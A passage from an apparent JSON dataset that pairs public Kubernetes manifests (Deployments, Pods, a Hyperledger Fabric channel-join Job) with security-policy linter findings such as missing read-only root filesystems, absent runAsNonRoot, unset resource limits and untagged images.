    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"order-service\" does not have a read-only root file system"
  },
  {
    "id": "01377",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"order-service\" is not set to runAsNonRoot"
  },
  {
    "id": "01378",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"order-service\" has cpu request 0"
  },
  {
    "id": "01379",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"order-service\" has memory limit 0"
  },
  {
    "id": "01380",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01381",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01382",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01383",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01384",
    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01385",
    "manifest_path": "data/manifests/the_stack_sample/sample_0442.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/version: v0.39.0\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/version: v0.39.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --logtostderr=true\n        - --config-reloader-image=jimmidyson/configmap-reload:v0.3.0\n        - --prometheus-config-reloader=quay.io/coreos/prometheus-config-reloader:v0.39.0\n        image: quay.io/coreos/prometheus-operator:v0.39.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: prometheus-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-operator\" does not have a read-only root file system"
  },
  {
    "id": "01386",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01387",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01388",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01389",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01390",
    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01391",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"edisonsupipelinesjavascriptdocker\" is using an invalid container image, \"containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01392",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" does not have a read-only root file system"
  },
  {
    "id": "01393",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" is not set to runAsNonRoot"
  },
  {
    "id": "01394",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" has cpu request 0"
  },
  {
    "id": "01395",
    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" has memory limit 0"
  },
  {
    "id": "01396",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pod-exemplo\" does not have a read-only root file system"
  },
  {
    "id": "01397",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pod-exemplo\" is not set to runAsNonRoot"
  },
  {
    "id": "01398",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pod-exemplo\" has cpu request 0"
  },
  {
    "id": "01399",
    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pod-exemplo\" has memory limit 0"
  },
  {
    "id": "01400",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel1\" does not have a read-only root file system"
  },
  {
    "id": "01401",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel2\" does not have a read-only root file system"
  },
  {
    "id": "01402",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel3\" does not have a read-only root file system"
  },
  {
    "id": "01403",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: 